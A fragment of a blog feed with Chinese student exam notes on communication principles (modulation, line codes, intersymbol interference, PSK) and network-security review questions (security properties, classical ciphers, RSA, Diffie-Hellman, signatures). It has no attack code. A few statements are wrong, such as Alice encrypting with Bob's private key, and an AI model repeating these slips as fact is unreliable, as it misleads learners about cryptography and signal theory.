        <content type="html"><![CDATA[<h5 id="第一章"><strong>第一章</strong></h5><p>1-11衡量数字通信系统有效性和可靠性的性能指标有哪些?</p><blockquote><p>有效性用传输速率和频带利用率来衡量，可靠性用误码率、误信率来衡量</p></blockquote><p><font color="blue">1-12何谓是码元速率和信息速率?他们之间的关系如何?</font></p><blockquote><p>码元速率定义为单位时间里传输码元的个数，单位为波特(Baud)，信息速率定义为单位时间传输的比特数，单位是bit/s</p><p>码元速率在数值上小于等于信息速率。码元速率决定了发送信号所需的传输带宽。</p></blockquote><p>1-13何谓误码率和误信率?它们之间关系如何?</p><ul><li>误码率是指错误接收的码元数在传输总码元数中所占的比例  Pe=错误码元数/传输总码元数</li><li>误信率是指错误接收的比特数在传输总比特数中所占得比例  Pb=错误比特数/传输总比特数</li><li>它们是描述差错率的两种不同表述，在二进制中，二者数值相等</li></ul><h5 id="第二章"><strong>第二章</strong></h5><p>确知信号按照其强度可以分为能量信号和功率信号。功率信号按照其有无周期性划分，可以分为周期性信号和非周期性信号。</p><p>2-1何为确知信号?</p><blockquote><p>确知信号是指其取值在任何时间都是确定的和预知的信号</p></blockquote><p>2-2试分别说明能量信号和功率信号的特性?</p><blockquote><p>能量信号的其能量为有限的正值，但其功率等于零;功率信号其能量近似等于无穷大，其平均功率为有限值</p></blockquote><h5 id="第三章"><strong>第三章</strong></h5><p>随机过程的定义</p><p>定义一:<strong>随机过程是所有样本函数的集合</strong>，定义二:<strong>随机过程看作是在时间进程中处于不同时刻的随机变量的集合</strong></p><p>随机过程的统计特性由其分布函数或概率密度函数描述。</p><p>什么是各态历经性过程？</p><blockquote><p>随机过程中的任何一次实现都经历了随机过程的所有可能状态<font color="blue">（一个随机过程的所有样本函数都服从同一分布）</font></p></blockquote><ul><li>与平稳过程关系：具有各态历经性的过程一定是平稳随机过程，反之不一定成立</li></ul><p>3-1何谓随机过程?它具有什么特点?</p><blockquote><p>随机过程是一类随时间随机变化的过程，他不能用确切的函数来表示。特点：1是对应不同随机试验结果的时间过程的集合，2是随机变量概念的延伸</p></blockquote><p>3-3何谓严平稳?何谓广义平稳?他们之间的关系如何?</p><ul><li>严平稳:若一个随机过程的统计特性与时间起点无关，时间平移不影响其任何统计特性</li><li>广义平稳:    均值与时间无关为常数，自相关函数只与时间间隔有关</li><li><font color="blue">关系:           若一个一般随机过程是严平稳随机过程，则它一定是广义平稳随机过程，反之不一定成立。若一个高斯过程，则严平稳随机过程与广义平稳随机过程等价。</font></li></ul><p>3-4平稳过程的自相关函数有哪些性质?他与功率谱密度的关系如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)平稳随机过程的自然相关函数与时间起点无关，只与时间间隔有关，而且是偶函数。(2) 平稳随机过程的功率谱密度与其自相关函数是一对傅里叶变换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235304920.png" alt="image-20221214235304920" style="zoom:50%;" /> </center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235400829.png" alt="image-20221214235400829" style="zoom:50%;" /><p>3-5什么是高斯过程，其主要性质有哪些?</p><blockquote><p>如果随机过程的任意的n维分布均服从正态分布，则称它为正态过程或高斯过程</p></blockquote><ol><li>高斯过程的n维分布只依赖于各个随机变量的均值，方差和归一化协方差;</li><li>广义平稳的高斯过程也是严平稳;</li><li>如果高斯过程在不同时刻的取值是不相关的，那么他们也是统计独立的;</li><li>高斯过程经过线性变换后仍然是高斯过程</li></ol><p>3-12什么是白噪声?其频谱和自相关函数有什么特点?白噪声通过理想低通或理想带通滤波器后的情况如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)噪声的功率谱密度在所有与频率上均为常数则称为白噪声;(2)频谱为一常数，自相关函数只在R(0)处为0 ;(3)通过理想低通或理想带通滤波器后分别变成低通白噪声或带通白噪声<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235802823.png" alt="image-20221214235802823" style="zoom:50%;" /></center>3-13何为高斯白噪声?它的概率密度函数、功率频谱密度如何表示?<blockquote><p>如果白噪声取值的概率密度分布服从高斯分布，则称之为高斯白噪声;其概率密度函数为高斯函数，其功率谱密度为常数</p></blockquote><p>3-13补充：什么是高斯噪声?它们各有什么特点?性质？P45</p><blockquote><p>高斯噪声:概率密度函数符合正态分布的噪声。</p></blockquote><blockquote><p>高斯噪声的特点:它的n维分布仅由各随机变量的数学期望、方差和两两之间的归一化协方差函数决定。若高斯噪声是宽平稳，则也是严平稳的。若随机变量之间互不相关，则也是统计独立的</p></blockquote><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000148202.png" alt="image-20221215000148202" style="zoom:50%;" /> <h5 id="第四章"><strong>第四章</strong></h5><p>按照传输媒质的不同分为：无线信道（自由空间或大气层）和有线信道（明线、电缆、光纤）</p><p>无线信道按照传播方式区分，包括地波、天波和视线传播三种。</p><p>有线信道分为有线电信道和有线光信道两大类</p><p>信道的数学模型分为调制信道模型和编码信道模型两类。</p><p>香农公式？<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000533207.png" alt="image-20221215000533207" style="zoom:50%;" /></p><p>4-6何为多径效应?</p><blockquote><p>多径传播对信号的影响称为多径效应。多径传播指信号信号经过几条路径到达接收端，而且每条路径的长度（时延）和衰减都随着时间而变。</p></blockquote><p>4-8何谓恒参信道，何谓随参信道，他们分别对信号传输有哪些主要影响?</p><pre class="line-numbers language-none"><code class="language-none">信道特性基本上不随时间变化或者变化很慢称为恒参信道;信道特性随机变化的信道称为随参信道;（乘性干扰随机变化的信道称为随参信道；乘性干扰基本保持恒定的信道称为恒参信道）恒参信道对信号传输的影响可以完全消除,而随参信道对信号传输的影响只能在统计平均的意义下消除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4-9何谓加性干扰，何谓乘性干扰?</p><blockquote><p>信道中的噪声 n(t)是叠加在信号上的，而无论有无信号，噪声n(t)是始终存在的，该n(t)称加性干扰。<br>信道的作用相当于对输入信号乘一个系数k(t)，该k(t)可看作是对信号的一种干扰，k(t)称为乘性干扰。</p><blockquote><p>无论信号有无都存在的噪声称为加性干扰;随信号大小变化的干扰称为乘性千扰~~(这个是原答案)~~</p></blockquote></blockquote><p>4-17试述信道容量的定义?</p><blockquote><p>信道容量是指信道能够传输的最大平均信息量</p></blockquote><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215001532071.png" alt="image-20221215001532071" style="zoom:67%;" /> <h5 id="第五章"><strong>第五章</strong></h5><p>模拟调制分为：幅度调制和角度调制</p><ul><li><p>幅度调制包括：调幅AM、双边带DSB、单边带SSB、残留边带VSB调制</p><ul><li>所占带宽、特点、调制效率(功率利用率)</li><li>调幅AM特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003003169.png" alt="image-20221215003003169" style="zoom: 33%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003100632.png" alt="image-20221215003100632" style="zoom: 33%;" /></li><li>双边带DSB特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003417004.png" alt="image-20221215003417004" style="zoom: 33%;" /></li><li>单边带SSB：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003509942.png" alt="image-20221215003509942" style="zoom:33%;" /></li><li>残留边带VSB调制：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003542088.png" alt="image-20221215003542088" style="zoom:33%;" /></li></ul><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003706914.png" alt="image-20221215003706914" style="zoom: 33%;" /> </center></li></ul><center>P122页表格</center>- 角度调制分为：调频FM和调相PM<p>线性调制的通用模型：滤波法和相移法</p><p>解调方法：相干解调和非相干解调</p><p>5-1何为调制?调制在通信系统中的作用是什么?</p><pre class="line-numbers language-none"><code class="language-none">调制:把信号转换成适合在信道中传输的形式的一种过程（按调制信号的变化规律去控制载波的某个参数的过程，书上解释）作用:频谱搬移;实现信道的多路复用;扩展信号带宽,提高系统的抗干扰能力、抗衰落能力，还可实现传输带宽与信噪比之间的互换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5-2什么是线性调制?常见的线性调制有哪些?</p><blockquote><p>正弦载波的幅度随调制信号做线性变化的过程。从频谱上说，已调信号的频谱结构与基带信号的频谱结构相同，只是频率位置发生变化。</p></blockquote><blockquote><p>常见的线性调制有调幅（AM)、双边带调制(DSB)、单边带调制(SSB)和残留边带调制(VSB)</p></blockquote><p>5-5为什么要抑制载波?相对AM信号来说，抑制载波的双边带信号可以增加多少功效?</p><blockquote><p>抑制载波可以提高调制效率；对于抑制载波的双边带，可以使其调制效率由1/3提高到1</p></blockquote><p>5-9DSB调制系统和SSB调制系统的抗噪声性能是否相同，为什么?</p><blockquote><p>相同，如果解调器的输入噪声功率密度相同，输入信号功率也相同，则单边带和双边带解调器输出的信噪比是相等的</p></blockquote><h5 id="第六章"><strong>第六章</strong></h5><p>6-4构成AMI码和HDB3码的规则是什么?它们各有什么优缺点?</p><blockquote><p>AMI的编码规则:将消息代码0（空号）仍然变换成传输码0，而把1(传码）交替的变换为传输码的+1，-1…。因此AMI码为三电平序列，三元码，伪三进制，1B/1T码。</p></blockquote><ul><li>AMI的优点:0,1不等概率是也无直流；零频附近的低频分量小；整流后即RZ码；编译码电路简单而且便于观察误码情况</li><li>AMI的缺点是:连续0码多时，RZ码连0也多，不利于提取高质量的位同步信号</li></ul><blockquote><p>HDB3的编码规则:先把消息代码变换AMI码，然后去检查AMI码的连零情况，没有四个或者四个以上的连零串时,这时的AMI码就是HDB3码;当出现四个或者四个以上的连零串时，将四个连零小段的第四个0变换于迁移非0符号同极性的符号，称为v符号（破坏码)。当相邻V符号之间有偶数个非零符号时，再将该小段的第一个0变成+B或者-B（平衡码)，B符号的极性与前一非零符号的极性相反，并让后面的非О符号从V符号开始再交替变化。</p></blockquote><p>HDB3码的优点:保持了AMl的优点，还增加了使连零串减少到至多三个，对于定时信号的恢复是十分有利的。</p><p>6-6什么是码间串扰?它是如何产生的?对通信质量有什么影响?</p><pre class="line-numbers language-none"><code class="language-none">(1)码间串扰:由于系统的总特性不理想，导致前后码元的波形畸变、展宽，并使前面的波形出现很长的拖尾，蔓延到当前码元的抽样时刻，从而对当前码元的判决造成干扰(2)码间干扰的产生是因为在第k个抽样时刻理想状态时抽样时刻所得的是仅有第k个波形在此时刻被取值，但在实际系统中，会有除了第k个波形以外的波形可能再抽样时刻被取值。码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降(3)码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6-7 为了消除码间串扰，基带传输系统的传输函数应满足什么条件?其相应的冲激响应应具有什么特点?</p><p>为消除码间串扰，基带传输系统的传输函数应满足:</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\传输函数.png"  /><p>即满足无码间串扰频域条件。</p><p>其相应的冲激响应应具有：</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\冲激响应.png"  /><p>即具有无码间串扰时域条件。</p><p>6-8何谓奈奎斯特速率和奈奎斯特带宽?此时的频带利用率有多大?</p><blockquote><p>理想低通传输特性的带宽称为奈奎斯特带宽,将该系统无码间干扰的最高传输速率称为奈奎斯特速率。此时频带利用率为2B/Hz</p></blockquote><p>6-13什么是眼图?它有什么作用?由眼图模型可以说明基带传输系统的哪些性能?具有升余弦脉冲波形的HDB,码的眼图应是什么样的图形?</p><blockquote><p>眼图是实验手段估计基带传输系统性能的一种方法。它是指接收滤波器输出信号波形在示波器上叠加所形成的图像</p></blockquote><pre class="line-numbers language-none"><code class="language-none">眼图和系统性能的关系：1.最佳抽样时刻是“眼睛”张最大的时刻;2.对定时误差的灵敏度可由眼睛的斜率决定，斜率越陡，对定时误差就越灵敏;3.图中阴影区域的垂直高度表示信号畸变范围;4.图中央的横轴位置对应判决门限电平;5.在抽样时刻上，上下阴影区的间隔距离之半为噪声容限,即若噪声瞬时值超过这个容限，就可能发生错误判决眼图：一种宏观评价系统性能得一种手段；&#96;最佳抽样时刻：眼睛张开最大得时刻；定时误差灵敏度：眼眶的斜率，斜率越大越敏感；判决明显电平：横轴；噪声容限：纵轴；(1)最佳取样时刻应选择在眼睛张开最大的时刻;(2)眼睛闭合的速率，即眼图斜边的斜率，表示系统对定时误差灵敏的程度，斜边愈陡，对定位误差愈敏感;(3)在取样时刻上，阴影区的垂直宽度表示最大信号失真量;(4)在取样时刻上，上下两阴影区的间隔垂直距离之半是最小噪声容限，噪声瞬时值超过它就有可能发生错误判决;(5)阴影区与横轴相交的区间表示零点位置变动范围，它对于从信号平均零点位置提取定时信息的解调器有重要影响。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具有升余弦脉冲波形的HDB,码的眼图中间会有一条代表0的水平线</p><h5 id="第七章"><strong>第七章</strong></h5><p>P205页信息</p><p>7-1什么是数字调制?它和模拟调制有哪些异同点?</p><blockquote><p>数字调制是用载波信号的某些离散状态来表征传送的信息,在接收端对载波信号的离散调制参量进行检测。<br>和模拟调制一样数字调制也有调幅，调频和调相三种基本形式，并可以派生出多种其他形式。在原理上二者并没有什么区别。只不过模拟调制是对载波信号的参量进行离散调制，在接收端也只需对载波信号的离散调制参量估值</p></blockquote><p>7-2数字调制的基本方式有哪些?其时间波形上各有什么特点?数字调制技术有两种方法:</p><blockquote><p>一是利用模拟调制方法去实现数字式调制，即把数字调制看成是模拟调制的一个特例，把数字基带信号当成模拟信号的特殊情况处理</p></blockquote><blockquote><p>二是利用数字信号的离散取值的特点通过开关键控载波，从而实现数字调制，这种调制方式通常有幅度键控、频率键控和相位键控。其时间波形上来说，有可能是不连续的</p></blockquote><p>7-5什么是频移键控?2FSK信号产生和解调方法有哪些?</p><blockquote><p>频移键控是指用不同的载频来表示所传送的数字信息。<br>产生:1、利用矩形脉冲序列对一个载波进行调频产生;2、利用受矩形脉冲序列控制的开关电路对两个不同的频率进行选通，即键控法。<br>解调:通常采用非相干解调和相干解调两种方法，同时还有鉴频法，过零检测法和差分检波法</p></blockquote><p>7-62FSK信号相邻码元的相位是否连续变化与其产生方法有何关系?</p><blockquote><p>采用模拟调频电路实现的2FSK信号，其相位变化是连续的;采用数字键控法产生的2FSK信号其相位变化不一定连续</p></blockquote><p>7-8什么是绝对移相?什么是相对移相?他们有何区别?绝对移相是用载波的相位直接表示码元;</p><blockquote><p>相对移相是用相邻码元的相对载波相位值表示数字信息。<br>相对移相信号可以看作是把数字信息序列绝对码变换成相对码,然后根据相对码进行绝对移相而成</p></blockquote><p>7-92PSK信号和2DPSK信号可以用哪些方法产生和解调?它们是否可以采用包络检波法解调?为什么?</p><blockquote><p>2PSK信号和2DPSK信号可以用模拟调制法和键控调制法产生;<br>2PSK信号可以用极性比较法，鉴相法解调，2DPSK信号通常用极性比较码变换法，差分相干法解调。<br>它们都不能采用包络检波法解调，因为它们是用相位而不是振幅来携带传送信息的</p></blockquote><p>7-102PSK信号及2DPSK信号的功率谱密度有何特点?试将它们与OOK信号的功率谱密度加以比较。</p><blockquote><p>2PSK信号的功率谱密度同样由离散谱和连续谱组成，但当双极性基带信号以相等的概率出现时，不存在离散谱部分。同时，连续谱部分与2ASK信号基本相同，因此，2PSK信号的带宽也与2ASK信号相同。此外，2DPSK信号的带宽也与2ASK信号的相同</p></blockquote><p>补充2DPSK如何克服π现象？</p><p>DPSK</p><pre class="line-numbers language-none"><code class="language-none">2PSK的“倒∏现象”或“反向工作”:在波形图中,假设相干载波的基准相位与2PSK信号的调制载波的基准相位一致(通常默认为0相位)。但是,由于在2PSK信号的载波恢复过程中存在着的相位模糊,即恢复的本地载波与所需的相干载波可能同相,也可能反相,这种相位关系的不确定性将会造成解调出的数字基带信号与发送的数字基带信号正好相反,即“1”变为“0”,“0”变为“1”,判决器输出数字信号全部出错。这种现象称为2PSK 方式的“倒π”现象或“反相工作”。这也是2PSK方式在实际中很少采用的主要原因。另外,在随机信号码元序列中,信号波形有可能出现长时间连续的正弦波形,致使在接收端无法辨认信号码元的起止时刻。为了解决上述问题,可以采用差分相移键控(DPSK)体制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre> <center><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\2DPSK相干解调法.png" style="zoom:50%;" /></center> ]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 通信原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全思考题</title>
      <link href="/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/"/>
      <url>/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="计算机网络安全思考题："><a href="#计算机网络安全思考题：" class="headerlink" title="计算机网络安全思考题："></a>计算机网络安全思考题：</h2><h3 id="第一章概述"><a href="#第一章概述" class="headerlink" title="第一章概述"></a>第一章概述</h3><h4 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong>计算机网络安全的概念是什么？网络安全有哪几个特征？各特征的含义是什么？</strong></p><ul><li>网络安全指网络系统的软件硬件、以及系统存储和传输中的数据收到保护，不因偶然的或恶意的原因而遭到破坏、更改、泄露，网络系统连续可靠正常的运行，网络服务不中断。</li><li>网络安全的特征及含义：<ul><li>机密性： 指保证信息与信息系统不被非授权的用户实体或过程所获取与使用</li><li>完整性： 指信息在生成、传输、存储和使用过程中不应被第三方篡改</li><li>可用性 ：指信息与信息系统可被授权实体正常访问的特性，即授权实体在需要时能够存取所需信息</li><li>可控性 ：对信息的存取和传播具有完全的控制能力，可以控制信息的流向和行为方式</li><li>真实性 ： 包括信息的完整性，准确性和发送人的身份真实性等方面</li></ul></li></ul></li><li><p><strong><font color=red>列出并简述主动攻击与被动攻击的分类</font></strong> </p><p><font color=orange>被动攻击:    试图获取和使用系统中的信息 ，但是不会对系统的资源产生破坏，包括消息内容泄露和流量分析</font></p><p><font color=orange>主动攻击： 试图改变系统的资源或者伪装成系统中的合法用户进行操作， 包括假冒，重传，篡改和拒绝服务</font></p></li><li><p><strong>网络安全体系包括哪几个部分？各部分又由哪几个方面组成？</strong></p><ul><li>网络安全体系由网络安全技术体系、网络安全组织体系、网络安全管理体系三部分组成</li><li>网络安全技术体系包括：物理安全、计算机系统平台安全、通信安全、应用系统安全</li><li>网络安全组织体系： 网络安全组织体系是多个网络安全组织按照一定的关系汇集形成的一套组织系统<ul><li>我国的网络安全组织体系，一是国家信息安全管理、协调或服务组织系统，二是各政府机构内设的专门承担信息安全管理或服务工作的实体或虚体机构。</li></ul></li><li>网络安全管理体系由法律管理，制度管理和培训管路3个部分组成</li></ul></li></ul><h3 id="第二章-密码学"><a href="#第二章-密码学" class="headerlink" title="第二章 密码学"></a>第二章 密码学</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 古典密码学维吉尼亚密码与希尔密码</span><span class="token comment"># 如何利用公钥密码技术实现即加密又认证</span><span class="token comment"># 如何利用公钥密码技术实现混合加密</span><span class="token comment"># 本章重点：Diffe-Hellman 秘钥交换协议 D-h的中间人攻击（简答）</span><span class="token comment"># Diffe-Hellman安全性分析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="计算题："><a href="#计算题：" class="headerlink" title="计算题："></a>计算题：</h4><h5 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h5><p>该密码体制有一个参数n。在加解密时，同样把英文字母映射为0－25的数字再进行运算，并按n个字母一组进行变换。明文空间、密文空间及密钥空间都是长度为n的英文字母串的集合，因此可表示 </p><blockquote><p>加密变换定义如下：</p><p>设密钥 k=(k1,k2,…,kn), 明文m=(m1,m2,…,mn), 加密变换为：Ek(m)=(c1,c2,…,cn), 其中ci(mi + ki)(mod26)，i =1,2,…,n</p><p>对密文 c=(c1,c2,…,cn),  解密变换为：Dk(c)=(m1,m2,…,mn), 其中 mi=(ci －ki)(mod26)，i =1,2,…,n</p></blockquote><h5 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h5><blockquote><p>Hill密码算法的基本思想是将n个明文字母通过线性变换，将它们转换为n个密文字母，解密即做逆变换</p></blockquote><p>算法的密钥K ={ <img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1676351740534.png" style="zoom:67%;" />上的N·N的可逆矩阵}，明文M与密文C均为n维向量</p><p>其中：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算.png" style="zoom: 67%;" /><p>有</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算矩阵形式.png" style="zoom: 80%;" /><p>或写成</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码加密.png" style="zoom:67%;" /><p>解密变换则为：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码解密.png" style="zoom:67%;" /><h5 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h5><ul><li><p>密钥的生成</p><ol><li>选择两个大素数 p，q，（p，q为互异素数，需要保密）</li><li>计算n = p×q， ψ(n) = (p－1)×(q－1)</li><li>选择整数 e 使 (ψ(n)，e) =1,   1&lt;e&lt; ψ(n) </li><li>计算d，使d = e－1mod ψ(n),</li><li>得到：公钥 为{e,n}； 私钥为{d}</li></ol></li><li><p>加密(用e，n):         明文：M &lt; n， 密文C = M ^ e(mod n)</p></li><li><p>解密(用d，n)：      密文C， 明文M = C ^ d (mod n)</p></li></ul><h5 id="Diffe-Hellman-秘钥交换协议"><a href="#Diffe-Hellman-秘钥交换协议" class="headerlink" title="Diffe-Hellman 秘钥交换协议"></a>Diffe-Hellman 秘钥交换协议</h5><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/Diffe-Hellman 秘钥交换协议.png" style="zoom: 67%;" /><h4 id="综合题："><a href="#综合题：" class="headerlink" title="综合题："></a>综合题：</h4><ul><li><p><strong><font color=orange>如何利用公钥密码技术实现    即加密又认证 （综合题）</font></strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/公钥密码技术实现加密及认证.png" style="zoom:50%;" /><p>提供保密：KUb        提供鉴别和签名:KRa    明文消息M</p><blockquote><p><font color=orange>Alice用自己的私钥进行数字签名，并与源文件一起用Bob的私钥进行加密</font></p><p><font color=orange>Bob在收到数据后用自己的私钥进行解密，并可以用Alice的公钥进行验证</font></p></blockquote></li><li><p><strong><font color=orange>如何利用公钥密码技术实现    混合加密 （综合题）</font></strong></p></li></ul><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/混合加密计算.png" style="zoom: 50%;" /><ul><li><p><strong><font color=orange>Diffe-Hellman安全性分析 (综合题)</font></strong></p><blockquote><p>网络安全课本P55页</p></blockquote><ul><li><p>Diffie-Hellman算法的优点:</p><ol><li>仅当需要时才生成密钥,减小了将密钥存储很长一段时间而致使遭受攻击的机会</li><li>除对全局参数的约定外,密钥交换不需要事先存在的基础结构</li></ol></li><li><p>缺点：</p><ol><li>在协商密钥的过程中,没有对双方身份的认证</li><li>它是计算密集性的,因此容易遭受阻塞性攻击:攻击方请求大量的密钥,而受攻击者花费了相对多的计算资源来求解无用的幂系数而不是在做真正的工作</li><li>没办法防止重放攻击</li><li>容易遭受”中间人攻击”，即恶意第三方C在和A通信时扮演B,和B通信时扮演A,与A和B都协商了一个密钥,然后C就可以监听和传递通信量</li></ol></li></ul></li></ul><h4 id="思考题：-1"><a href="#思考题：-1" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong><font color=red>简述密码体制及其组成成分：</font></strong></p><ul><li>用于加解密并能解决网络安全中的机密性、完整性、可用性、可控性和真实性等问题中的一个或几个的系统称为密码体制</li><li>包括密文空间C，明文空间P，秘钥空间K , 加密算法E，与解密算法D</li></ul></li><li><p><strong>简述对称密码算法的基本原理</strong></p><ul><li>对称算法又叫传统密码算法:加密密钥能够从解密密钥中推算出来,反过来也成立。</li><li>对称算法要求发送者和接收者在安全通信之前,协商一个密钥。</li><li>对称算法的安全性依赖于密钥,泄漏密钥就意味着任何人都能对消息进行加解密。</li><li>对称算法的加密和解密表示为:EK(M)=C </li></ul></li><li><p><strong>简述对称密码算法和非对称密码算法的区别：</strong></p><ul><li><p>在对称密码体制中，加密和解密使用完全相同的秘钥，或者加密秘钥和解密秘钥彼此之间非常容易推导。在公钥密码体系中，加密和解密使用不同的秘钥，而且由其中的一个推导另一个是非常困难的。在两个秘钥中，一个是公开的，而另一个保持秘密性<del>（老师表示这个答案有错）</del></p></li><li><p>在安全性方面，对称密钥密码体制是基于复杂的非线性变换与迭代运算实现算法安全性的，而非对称密钥密码体制则一般是基于某个公认的数学难题而实现安全性的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这部分来自密码学课件，至少比课本上全面</span>对称秘钥密码体制：加密、解密运算的处理速度块，效率高，算法安全性高，对称密码算法的密钥分发过程复杂，所花代价高； 密钥管理量的困难；保密通信系统的开放性差； 存在数字签名的困难性非对称密码体制：密钥分配简单，系统密钥量少，便于管理 ，系统开放性好，且可以实现数字签名。加密、解密运算效率较低，处理速度较慢，同等安全强度下，非对称密码体制的密钥位数较多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong><font color=red>RSA算法的理论基础是什么？简述RSA算法的流程？</font></strong></p><ul><li>大整数的素因子分解是困难问题，即求两个大素数的乘积是容易的，但是将一个大整数分解成两个大素数之积则是困难的<ul><li>选取两个大素数p和q，两个数长度接近，一般在256比特长</li><li>计算n=p * q, ψ(n)=(p-1)(q-1)</li><li>随机选取整数e，满足gcd(e, ψ(n))=1</li><li>计算d，满足d*e=1（modψ(n)）</li><li>n公开， p和q保密   e为公钥，d为私钥。</li><li>消息m &lt; n<br>加密算法：c=E(m)=m^e   (mod n)<br>解密算法：m=D(c)=c^d   (mod n)<br>签名： s=md(mod n)</li></ul></li></ul></li><li><p> <strong><font color=orange>D-h的中间人攻击（简答）</font></strong></p></li></ul>  <img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/D-h的中间人攻击.png"  /><h3 id="第三章-消息鉴别与数字签名"><a href="#第三章-消息鉴别与数字签名" class="headerlink" title="第三章 消息鉴别与数字签名"></a>第三章 消息鉴别与数字签名</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 考点：消息加密 ， MAC函数 ， 哈希函数 ， 公钥密码签名等 ， A - B 公钥加密与签名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong>消息鉴别主要用于对抗哪种类型的攻击？</strong></p><ul><li>消息鉴别主要用于对抗伪造消息和篡改消息（包括内容篡改，序号篡改与时间篡改）</li></ul></li><li><p><strong><font color=red>根据鉴别符的生成方式，鉴别函数可分为哪几类？各自具有什么特点？（掌握）</font></strong></p></li><li><p>基于鉴别符的生成方式，鉴别函数可分为如下3类：</p></li><li><p>基于消息加密方式的鉴别：以<strong>整个消息的密文为鉴别符</strong></p><ul><li>基于消息鉴别码（MAC）的鉴别：利用公开函数和秘钥产生一个较短的定长值作为鉴别符，并与消息一同发送给接收方，实现对消息的验证。</li><li>基于散列函数的鉴别：利用公开函数将任意长的消息映射为定长的散列值，并以该散列值作为鉴别符</li></ul></li><li><p><strong><font color=red>散列函数应该具有哪些安全特性？（掌握）</font></strong></p></li><li><p>散列函数必须满足一定的安全特征，主要包括3个方面：单向性、强对抗碰撞性和弱对抗碰撞性</p><ul><li>单向性：对任意给定的散列码h，找到满足H（x）=h的x在计算上是不可行的，即给定散列函数h，由消息M计算散列值H(M)是容易的，但是由散列值H(M)计算</li><li>强对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h，寻找两个不同的消息M1和M2，使得h (M1) = h (M2)在计算上是不可行的</li><li>弱对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h和一个随机的消息M，寻找消息M1使得h (M) = H(M1)在计算上是不可行的。</li></ul></li><li><p><strong><font color=skyblue>什么是数字签名？数字签名具有哪些特征？（理解）</font></strong></p></li><li><p>数字签名是手写签名的数字化形式，是公钥密码学发展过程中最重要的概念之一<del>（是指附加在某一电子文档中的一组特定的符号或代码）</del>  删除线内是课件的内容</p><ul><li>数字签名的特征<ul><li>可验证性：信息接收方必须能够验证发送发的签名是否真实有效</li><li>不可伪造性： 除签名人外，任何人不能伪造签名人的合法签名。</li><li>不可否认性： 发送放在发送签名消息后。无法抵赖发送的行为；接收方在收到消息后，也无法否认接收的行为</li><li>数据完整性： 